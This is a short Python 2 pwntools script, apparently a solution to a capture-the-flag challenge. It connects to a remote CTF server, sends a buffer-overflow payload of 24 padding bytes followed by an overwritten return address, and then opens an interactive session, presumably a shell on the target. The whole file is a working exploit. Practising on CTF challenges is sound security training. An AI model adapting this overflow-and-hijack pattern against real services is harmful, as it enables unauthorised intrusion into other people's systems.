#!/usr/bin/env python2
from pwn import *


host , port = 'ctf.yuawn.idv.tw' , 10100
#host , port = '192.168.78.251' , 4000
y = remote( host , port )

p = 'a' * 24
#p += 'EBBP'
p += p32( 0x80484cb )
y.send(p)

y.interactive()